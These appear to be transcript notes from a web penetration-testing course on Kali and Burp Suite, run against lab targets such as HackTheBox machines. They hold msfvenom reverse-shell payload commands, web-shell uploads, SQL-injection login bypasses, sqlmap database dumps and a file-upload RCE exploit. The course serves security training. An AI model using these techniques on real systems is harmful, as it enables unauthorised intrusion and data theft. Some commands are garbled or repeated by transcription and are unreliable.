> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=0)** - [Instructor] When web testing, we will often follow an exploitation chain that starts with gaining administrative access to the web server, then allow its user shell to be gained on the target, and then we escalate privileges to gain root control. An initial web shell will typically use one of the many [[Forms]] of active scripting code. Consequently, we need a variety of shells on hand to include in our exploits and to use as standalone modules to deliver shells. Because different targets will have different forms of active code, we need to have as many web shells available as possible. We need to be able to upload our shell file into a folder which is remotely URL accessible for [[Linux]] Apache. This is typically in /var/www/ or one of its descendant folders such as /var/www/[[HTML]]. For [[Windows]] IIS, this is typically in \inetpub\wwwroot\. Other [[Web Servers]] will have their own default directories. ColdFusion, for example, has a CFIDE folder at the webroot in which content is placed. Kali provides a number of web shells to support the various active code options. Let's take a look at them. Ls /usr/share/webshells.
>
> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=89)** Here we can see folders for ASP, ASPX, CFM, JSP, Laudanum, PERL, and [[PHP]]. These all contain different variants of the same basic shell approach. A popular form of active content is PHP. The PHP reverse shell provides an excellent approach to gaining shell access on a target. Let's see what it looks like. Before I do that, however, I'll just run a quick script to check my IP address. Okay, my IP address at the moment is 10.0.2.18. Sudo nano /usr/share/webshells
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=133)** /php/php-reverse-shell.php.
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=143)** Let's scroll down past the comments. We can see the dollar IP and dollar port variables are being set. We need to change these to the callback socket that we'll set up, our Kali system IP address and our preferred port. I'll change these to 10.0.2.18 and 2222. And we'll save this as purrs.php. Two other forms of shell we might find useful are ASP and ASPX. ASP is an older technology but is a default part of older [[Microsoft]] IIS websites. Let's look at the ASP shells. ASP. Command ASP dot ASP will allow a single command to be run via the web server. Command ASP 5.1 ASP is a variant of command ASP dot ASP, which gets around an execution prevention mechanism in our IIS 5.1. This uses the [win.com](https://win.com) executable to force execution of the command processor. We've got similar files in ASPX. Command ASP dot ASPX is a popular web shell and is also known as Awin. This is a single command reverse shell, again using a command field on the browser.
>
> **[3:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=238)** These web shells run in the browser and don't give us a reverse command shell to work in, but we can issue individual commands or we can potentially execute [[Netcat]] to connect a listener and get a reverse shell. Let's check the JSP web shells. We can see command JSP dot JSP. Let's have a look at what that looks like. Sudo nano /usr/share /webshells/jsp /cmdjsp.jsp. This shell can work either on a Linux server or a [[Windows Server]]. As it notes at the top, the executable needs to be changed to reflect the target before deployment. It's set here for a Windows server using CMD to process Windows commands. Let's see what's in the Perl folder. And let's take a look at the Perl reverse shell. Sudo nano /usr/share/webshells /perl/perl-reverse-shell.pl.
>
> **[5:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=324)** This looks familiar. It's a variant to the PHP script that we saw. [[Metasploit|MSF]] Venom is one of the most important tools which Kali provides, and it can generate a variety of web shells. We can create ASP payloads using the minus F switch to specify ASP format. For example, we can create a Meterpreter ASP payload with Shikata-Ga-Nai encoding. [[Metasploit|Msfvenom]] -p windows/meterpreter/ reverse_tcp LHOST=10.0.2.18 LPORT=2222 -e x86 /shikata_ga_nai
>
> **[6:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=388)** - f asp and we'll store that as met.asp. We can similarly create GSP payloads to reverse connect back to a command shell. Msfvenom -p [[Java]]/ jsp_shell_reverse_tcp
>
> **[6:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=419)** LHOST=10.0.2.18 LPORT=2222 -f raw and we'll save that as cmd.jsp. We can now upload these implants to web servers running the respective active code, put them into its webtree, and we can gain a command or meterpreter shell by accessing them via the url. So we have a number of existing shells and we can create our own.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (8), [[Forms]] (3), [[Windows]] (3), [[Linux]] (2), [[Web Servers]] (2)
> **Env Vars:** asp (15), aspx (4), jsp (4), php (4), iis (3)
> **CLI Commands:** php (8), sudo (3), apache (1), ls (1), find (1)
> **Versions:** 10.0.2 (4), 5.1 (2)
> **Definitions:** is a  (4), is an  (1), known as (1)
> **Code Identifiers:** reverse_tcp (1), shikata_ga_nai (1), jsp_shell_reverse_tcp (1)
> **Analogies:** for example (2), such as (1)
> **File Paths:** php/php-reverse-shell.php (1), purrs.php (1)


### 3. Advanced Website Enumeration

[↑ Back to Table of Contents](#table-of-contents)

#### [Busting open a website](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=0)** - [Instructor] As with any pen testing challenge, enumeration is the key to success. It's really important that we have visibility of what we're testing in as much detail as possible. That means looking beyond the obvious, which differentiates pen testers from script kits. When testing a website, it's fairly straightforward to spider through the site, going from one page and enumerating all pages it calls. And then all the pages they call, until we have a link tree of all pages in the website. We can then check each page for known vulnerabilities. However, for advanced testing we want to see what exists in the website even if it's not directly linked up to the default route. This is often the case when the website consists of multiple functions such as an administration or management portal, and when it has hidden test pages. These hidden pages may get less attention or may only be partially built. And these are often where we can find hidden paths into the system. Let's look at what Kali provides to help us find out what's inside a website. I'm looking at a Mytilidae website server at 192.168.1.176, and it returns just a default Apache website page. There's no content accessible from the main webpage and no indication of additional pages. Kali provides a command line tool called [[Gobuster]] to do dictionary based testing to identify additional pages on a website.
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=95)** Let's run Gobuster on this site and use one of Kali's pre-loaded dictionaries. The two basic parameters we need to provide are the URL or IP address and the [[Microsoft Word|word]] list to use for the dictionary attack. We can also use the X switch to look for specific types of files. We'll check for [[PHP]] files. Gobuster dlr
>
> **[1:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=119)** - u 192.168.1.176
>
> **[2:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=127)** - x php -w, and the word list file we use as /usr/share/wordlists/dirbuster
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=143)** /directory-list-lowercase-2.3-medium.txt.
>
> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=153)** We quickly find that there's an index folder as well as folders for [[WordPress]] and Joomla. The scan doesn't find Mytilidae as this isn't a word contained in the dictionary we are using. It does however find a file called phpinfo.php. Let's take a look at that. This provides a fair bit of detail of the [[System Configuration]]. We can see it's using PHP version 7.4 on a [[Ubuntu]] 20.04 server. We can see in the details pane, that it's using the [[Linux]] 5.15 kernel. Further down, we see details of the web environment. Including configuration details for my [[SQL]] and OpenSSL. This is very useful information for us, so that we can scope out the kind of testing we might look at conducting once we finish reconnaissance. Given we know there's a Mytilidae folder, we can run Gobuster again, adding the Mytilidae page on the URL. Now we see the sub folders and PHP files used in the Mytilidae website. We'll leave Mytilidae for the moment. Let's take a look at the Filmbox easy server on Offensive Security on IP address 192.168.60.111. We find it also has just a default Apache page. Let's use Gobuster to see what we can find. Gobuster dir -you 192.168.60.111.
>
> **[4:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=255)** And we'll look for PHP files as well. And again, we'll use /usr/share/wordlists
>
> **[4:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=268)** /drlbuster/directory-list-lowercase-2.3-medium.text.
>
> **[4:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=282)** We very quickly find a number of folders including one called Secret. Apparently, we need to try harder. There's another one called Admin. The Admin page looks like we might have a way in if we can bypass authentication. We'll enter admin for the username and quote space, or one equals one hash, for the password. And we're at the admin dashboard.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Gobuster]] (6), [[PHP]] (6), [[Microsoft Word|Word]] (3), [[WordPress]] (1), [[System Configuration]] (1)
> **CLI Commands:** find (8), php (6), apache (2)
> **Versions:** 192.168.1 (2), 2.3 (2), 192.168.60 (2), version 7 (1), 20.04 (1)
> **Env Vars:** php (4), url (2), sql (1)
> **Speakers:** - [instructor] (1), - u (1), - x (1)
> **File Paths:** directory-list-lowercase-2.3-medium.txt (1), phpinfo.php (1)
> **Tools:** command line (1)
> **Analogies:** such as (1)

#### [Identifying virtual websites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=0)** - [Instructor] When looking at a host, it's easy to assume that whatever is presented as the default website is the complete service. But this is often not the case. As we've seen, the server may have many different web trees which we can access using different URL extensions to access their route pages. We also need to be aware that Apache allows multiple name-based websites to be served from just one IP address. Virtual hosts are accessed not by their IP address, but by their URL. DNS will resolve the IP address and the virtual host server will direct the incoming connection to the required virtual web server based on the URL. The host will always have a primary virtual website which will respond to any request not specifying a name-based website. We can see here two websites which we would connect to, not with the IP address, but with their names [example1.com](https://example1.com) and [example2.com](https://example2.com). As a penetration tester, finding all the vhosts that run on a host is important because any one of these websites may contain vulnerabilities that allow access to the underlying server and hence, all of the [[Web Servers]] being run. Unfortunately, identifying the server is a name site server and identifying the websites on it is a challenge and not something that appears immediately obvious with standard enumeration.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=93)** Here we see this. An Apache server may also host multiple virtualized websites each with its own IP address by using different network interface cards. From a pen testing perspective, these can be enumerated as though each runs on its own server. Let's take a look at the Hack The Box server called Cronos. Browsing to it, we find that it shows only the default Apache page. To find anything useful, we need to have some additional intelligence or make some guesses. In this case, we know that the server is named Cronos and that it's a host server in the Hack The Box domain. Let's try using the name cronos.[[HackTheBox|htb]]. We need to resolve the name into its IP address. So let's add this to our /etc/hosts file. sudo nano /etc/hosts. And we'll add 10.10.10.13 and call it cronos.htb. So now let's browse to [http://cronos.htb](http://cronos.htb).
>
> **[2:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=173)** We now see that Cronus is indeed a virtual host named website. Once we have this validation, we can start to do quite a lot more enumeration and vulnerability scanning. Let's find out what other websites exist on this server. To do this, we need to use the dig tool and do a zone transfer from the server. dig AXFR @10.10.10.13 cronos.htb.
>
> **[3:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=204)** And will use the +nostat +nocmd +nocomments.
>
> **[3:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=214)** Dig provides a list of all named hosts for the cronos.htb domain, admin.cronos.htb, ns1.cronos.htb, and www.cronos.htb. We've already seen the www.cronos.htb, so let's now see what we can find in admin.cronos.htb. And we'll need to add this to the /etc/hosts file as well. 10.10.10.13. admin.cronos.htb.
>
> **[4:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=257)** Okay, this is a separate web server and we get a login for the admin site. We won't go any further. But enumerating for virtual hosts is a challenge. And at this stage, one which requires inspiration as much as analysis.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[HackTheBox|Htb]] (11), [[Web Servers]] (1)
> **CLI Commands:** find (4), apache (3), make (1), sudo (1)
> **Env Vars:** url (3), dns (1), axfr (1)
> **Definitions:** is a  (4)
> **URLs:** [example1.com](https://example1.com) (1), [example2.com](https://example2.com) (1), [http://cronos.htb](http://cronos.htb) (1)
> **Versions:** 10.10.10 (3)
> **Warnings:** be aware (1)
> **Speakers:** - [instructor] (1)

#### [More ways to find web pages](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=0)** - [Instructor] Let's look at another tool for enumerating websites called DirBuster. We can find this in applications, web application analysis, web crawlers, and directory brute force tools. DirBuster is a graphical interface for doing a dictionary or brute force attack on a website to identify new top level pages. It's the gooey form of [[Gobuster]]. Let's use it to take a look at the offensive security target called Lampião. I already know from enumeration that there's nothing on Port 80, but a second website exists on Port 1898. So let's enter the URL: [http://192.168.60.48.1898](http://192.168.60.48.1898) [http://192.168.60.48.1898](http://192.168.60.48.1898) Let's leave the work type and scanning methods as default, but increase the Number Of Threads to 25 to increase the speed of scanning. We'll need to select a dictionary to use. We'll use the same lowercase dictionary as before and we'll go into user, share, wordlists, DirBuster, and our directory-list-lowercase-medium. DirBuster is set by default to brute force both folders and files, and [[PHP]] files, types are selected. 'Kay, so let's start the scan.
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=96)** We can see in the panel the folders that we're finding as we go. We can see progress at the right-hand bar for each stream of work, and at the bottom right, we can see the folder names we're testing for. We can select Tree View to look at a more compact view of the site as we're finding it. There's a lot of configuration we can do in DirBuster. Let's have a look at the Options menu and the Advanced Options. An Advanced Options window pops up with five tabs. We're on the first tab, which is [[HTML]] Parsing Options. This shows which elements of the page, DirBuster, will extract links from. We can right click on a link in the middle pane and we get an option to delete it. Below this pane, we can add another element. We can also say, above this pane that we're not going to process any links to image files. Let's check out Authentication Options. This is where we can add a user ID and a password to get access to authenticated areas of the website. The next tab is Http Options. And in here, at the top, we can add Custom HTTP Headers. It's not uncommon to find HTTP servers using custom headers including X-Powered-By, X-Cash, X-Pingback, X-Forwarded-For, and X-HTTP-Method-Override. [[WordPress]], for example,
>
> **[3:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=188)** uses X-Powered-By and X-Pingback. Note, we have to have a strinouncing itself as the user agent, a clear giveaway in a red team that the risk reconnaissance is underway. This is one field you may wish to change. We're not running through a proxy right now, but we could stage this through [[Burp Suite]] if we wanted to inspect the messages. The next tab is Scan Options. And here, we can set the timeout value for the message and also provide an upper limit on the number of requests per second if we want to be a little bit more stealthy. The final tab, DirBuster Options, allows us to update DirBuster and set the Number of threads to run and the File extensions. Duplicating what we can do from the main screen. Okay, let's leave DirBuster for now. [[Dirb]] is another dictionary-based enumeration tool which is simple to use and runs relatively quickly using a built-in set of common folders and file names. DIRB runs from the command line and in its simplest form, takes the URL as an argument. Let's run this against Lampião. dirb [http://192.168.60.48:1898](http://192.168.60.48:1898) dirb [http://192.168.60.48:1898](http://192.168.60.48:1898) dirb [http://192.168.60.48:1898](http://192.168.60.48:1898) We can see, it's picked up its own common dictionary and is running through that. This happens very quickly
>
> **[4:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=282)** and we find the folders that we saw earlier with DirBuster. DIRB also provides some options. We can specify our own [[Microsoft Word|word]] list and we can indicate extensions to try such as HTML or PHP. The final Carly tool we'll look at for finding web pages is Wfuzz. While it's not specifically designed to look for hidden pages, we can use it for this purpose. It needs to know the word list to use and the URL to start with, and we can also tell it what responses to ignore. For example, we'll ignore 404 Page Not Found. wfuzz -c -z wfuzz -c -z file,/usr/share/ file,/usr/share/ wordlists/dirbuster/ directory-list-lowercase-2.3-medium.txt directory-list-lowercase-2.3-medium.txt
>
> **[5:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=349)** - -hc=404 [http://192.168.60.48:1898](http://192.168.60.48:1898) [http://192.168.60.48:1898](http://192.168.60.48:1898) [http://192.168.60.48:1898](http://192.168.60.48:1898) and we use /FUZZ/ at the end. and we use /FUZZ/ at the end. We can see, it's detecting various lines of text which we're not interested in, as well as valid folders. We can see icons, themes, scripts, and other folders being detected. Wfuzz is very fast and it can be used to get a top level short list of URLs to test. You'll quickly get used to your favorite tool and you'll develop your own dictionary files for each type of target. Carly provides a good range of word lists across its tools and you can add to these as you progress.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Dirb]] (6), [[Microsoft Word|Word]] (3), [[PHP]] (2), [[HTML]] (2), [[Gobuster]] (1)
> **Env Vars:** url (3), http (3), dirb (3), php (2), html (2)
> **Versions:** 192.168.60 (8), 48.1898 (2), 2.3 (2)
> **URLs:** [http://192.168.60.48:1898](http://192.168.60.48:1898) (6), [http://192.168.60.48.1898](http://192.168.60.48.1898) (2)
> **Ports:** :1898 (6), port 80 (1), port 1898 (1)
> **CLI Commands:** find (3), php (2)
> **Analogies:** for example (2), such as (1)
> **File Paths:** directory-list-lowercase-2.3-medium.txt (2)


### 4. Finding Vulnerabilities

[↑ Back to Table of Contents](#table-of-contents)

#### [Vulnerability scanning with Burp Suite](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=0)** - [Instructor] The tool most professional pen testers use for web testing is [[Burp Suite]], and we'll be using it for our advanced testing. Carly includes the free community version, but this doesn't support vulnerability scanning, the professional edition does, and we'll use that to learn how to crawl a website to look for vulnerabilities. If you are not familiar with Burp Suite, do take my Burp Suite Essentials course to get started. Web application scanning is one of the most important defensive measures we can take to protect our websites, but it takes time, and a typical scan will produce a large number of issues. These need to be filtered out to those which are an exploitation risk, and this requires that we combine a scan with targeted [[Penetration Testing]], to demonstrate which of the scan findings are exploitable issues. Let's check the hack the box popcorn web application for vulnerabilities. We already know from earlier enumeration, that the server has a Torrent application running. To start our web scan, we'll select proxy, and we'll turn intercept off, and we'll open a browser. And we'll connect to 10.10.10.6/torrent.
>
> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=83)** Back in Burp Suite, we'll go to target and have a look at the site map, and we can see the Torrent folder, we'll right click and select scan. Here we can set the scan parameters. We set to crawl and audit the popcorn site, using HTTP and HTTPS. We'll change the scan to use the specified protocol HTTP. And we'll press okay. Back at the dashboard, we can see in the left pane, that an unauthenticated crawl has started, and we've already detected some information rated audit issues, as well as a high rated issue. Crawling a website takes a while, so we'll come back when this finishes. Once all the crawling has finished, Burp Suite begins its audit. It starts by identifying the items it wants to audit. As the audit progresses, we can see issues being added in the top right hand issues pane. Back on the site map, we can see red dots starting to appear beside pages with high severity issues. At the right, we can see there's a high severity issue on clear text submission of password. When we click on that, we get the vulnerability summary shown in the lower panel. Below that, we find the background explaining the issue, and also the steps we need to take to remediate it.
>
> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=178)** At the bottom, we find links to further details for the vulnerability. We'll let the audit continue and leave popcorn for now. Doing a scan provides a lot of useful information for us, in securing our website.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Burp Suite]] (5), [[Penetration Testing]] (1)
> **Env Vars:** http (2), https (1)
> **CLI Commands:** find (2)
> **UI Navigation:** go to (1), click on (1)
> **Versions:** 10.10.10 (1)
> **Speakers:** - [instructor] (1)

#### [Using sqlmap to validate SQL injections](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=0)** - Let's take a look at how we approach validation of a web server issue using [[SQLmap]]. We've done our web app testing on the [[HackTheBox]] popcorn server and we've found a torrent page which is injectable. In order to demonstrate the vulnerability, we'll start by going to "proxy", make sure Intercept is off, and open the browser. And we'll connect to 10.10.10.6/torrent.
>
> **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=33)** And we'll enter "admin", "admin", and that doesn't work. But we want to validate that it is an [[SQL]] injection vulnerability. So let's now go back to [[Burp Suite]] and to "HTTP history" and look for the "POST" message. We'll select this and in the Request details at the bottom, select "Copy to file" and we'll call that "popreq" and save it. In the Kali terminal, we can use this to run an sqlmap test: "sqlmap -r popreq" As we start running, we'll be asked a few questions and we can take the defaults. That's done, and we found an injection point, so we can now repeat the sqlmap request, adding the dbs switch to use the injections sqlmap found to list all [[Databases]]. Let's select the "torrenthoster" database and run sqlmap again to find its tables.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=120)** And we get a list of tables. We can select the "users" table and dump out its contents.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=133)** We can see we have an admin password and sqlmap can try to crack it for us. We'll try with the rockyou.txt dictionary file.
>
> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=153)** Okay, we'll leave that to see if it can crack the password, and we'll come back to it when the crack finishes. Well, we weren't successful with cracking the hash in this case, but we still got plenty of evidence that there's a significant issue. Sqlmap is a powerful tool to check for, and exploit, vulnerabilities in backend SQL databases, so that we can validate our scan results.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQLmap]] (8), [[SQL]] (2), [[Databases]] (2), [[HackTheBox]] (1), [[Burp Suite]] (1)
> **Env Vars:** sql (2), http (1), post (1)
> **UI Navigation:** select the (2), open the (1), switch to (1)
> **CLI Commands:** make (1), find (1)
> **Definitions:** is an  (1), is a  (1)
> **File Paths:** rockyou.txt (1)
> **Versions:** 10.10.10 (1)
> **Cross-References:** go back to (1)


### 5. Attacking the Website

[↑ Back to Table of Contents](#table-of-contents)

#### [Exploiting your way into the gym](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=0)** - Let's take a look at this gym management system which we can download from the source code tester site Shown here. This is a standard website which runs on a lamp stack system. I've downloaded and unzipped this application. We can see this is a [[PHP]] website, and if we have a look in the database folder, we can see the setup script for it. The installation instructions require us to set up the application by importing this setup script. In addition, we need to modify the DB connect .pi script and update it with our privileged [[SQL]] user credentials. I've done this already, so let's go take a look at it. 192 dot 168 dot 1 dot 176 slash gym 1.
>
> **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=56)** Okay, we're asked to enter credentials. Our first exploit will be the obvious one. We'll run an SQL injection by entering the user account as quote space
>
> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=70)** - Or
>
> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=71)** - One equals one
>
> **[1:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=73)** - Hash
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=77)** - And we've logged in as the administrative user. There's a slightly more advanced version of the gym management system that we can find at this site and this particular variant has an upload function which we can exploit. We can search for exploits of gym systems using search 'sploit space Gym, and we find there's a [[Python (Programming Language)|Python]] script for an unauthenticated remote code execution which is for this system. So let's copy Slash user slash share slash exploit db slash exploits slash php web apps 4 8 5 0 6 dot py
>
> **[2:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=132)** - Into our current folder.
>
> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=135)** - Unfortunately, this particular script doesn't run out of the box and we have to make some changes to it. I've taken a lot of the fancy formatting out and simplified the exploit code and made it Python three usable. So let's take a quick look at that. Nano, and I've called it "exgym" Dot py.
>
> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=157)** - We go down past the comments. We can see that the exploit runs in two stages. The first is to upload a file called kamehameha dot php using the upload PHP function in the gym management system. This has a PNG header on it to make it look like a PNG image file. The second is then to run the kamehameha php code passing in a command using the telepathy variable which it executes. Okay, let's try running this. Python three exgym dot py and we want to send this to 192 dot 168 dot 1 dot 176 slash gym2.
>
> **[3:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=212)** Okay, we've now got command prompt and we can start issuing commands. Who am I? I'm www data and we can list the folder. Note the kamehameha dot php file. This is our executable payload that we are working through. Okay. We've successfully exploited the gym management software using a Python exploit to gain a web shell service.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (6), [[Python (Programming Language)|Python]] (4), [[SQL]] (2)
> **CLI Commands:** php (6), python (4), find (2), make (2)
> **Speakers:** - let (1), - or (1), - one (1), - hash (1), - and (1)
> **Env Vars:** php (2), sql (2), png (2)
> **Definitions:** is a  (2)
> **Prerequisites:** setup (2)
> **Tools:** command prompt (1)
> **Exercise Files:** source code (1)

#### [Exploiting through an ASPX shell with Cadaver](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=0)** - Web distributed authoring and versioning, WebDAV, is an extension of HTTP that allows clients to perform remote web content authoring operations. For WebDAV sites, which also allow HTTP messages, there's a very effective tool we can use to upload a shell. The tool's called cadaver and it's simple to use. Cadaver supports file upload, download, on-screen display, move and copy, collection creation and deletion, and locking operations. As a PEN tester, the main use we have for it is to upload a file, typically a web shell. Cadaver uses a command line syntax similar to FTP. Let's look at the manual documentation for it.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=46)** - [Male voice on WebDAV Program] Man cadaver.
>
> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=50)** - It has a number of options but we won't be using any of them. We will, however, be using its commands. We can see that it has a lot of useful bash light commands for testing. And there's also a number of commands relating to collections, which are, to all intents and purposes, folders managed by WebDAV. Let's take a look at the hack the box granny server on 10.10.10.15. We can see that the server website is still under construction and there's nothing for us to work with here. Let's check the basics out with whatweb 10, dot 10, dot 10, dot 15. And we see this is powered by [ASP.NET](https://ASP.NET), so we know the kind of shell will want loaded. We can run [[Nikto]] to get a bit more information. Nikto minus H 10, dot 10, dot 10, dot 15. Nikto reports the OSVDB-397 vulnerability that the server supports the HTTP method "PUT", and this allows clients to save files on the web server. That's exactly what we wanted to see. Let's stop this now and we'll use the [[Nmap]] WebDAV script to see whether WebDAV is supported. Nmap 10, dot 10, dot 10, dot 15 minus, minus script equals http WebDAV
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=143)** scan. So the HTTP service has a number of method types including "PUT". And it supports a number of WebDAV methods. Let's see what we can find using cadaver. Cadaver 10, dot 10, dot 10, dot 15. Okay, we get the DAV prompt, so we're in business. Let's run the LS command to see what's in the folder. We have a number of folders and the IIS start HTM file. This is the web route. We have ASP and ASPX command web shells. so I can upload one of them. I'll upload the ASPX command ASP shell and I'll save it as awen dot text. This is a technique we can use to avoid the shell being executed as we're uploading it, as all we'll get in that case is the execution output. Put, slash, user, slash, share, slash, web shells, slash, ASPX, slash, cmbASP, dot ASPX. And we'll call that awen dot text. Okay, we've uploaded our ASP shell, so now let's rename it using the move command. Note that cadaver also supports the copy command. Move awen dot text to awen dot ASPX. Okay.
>
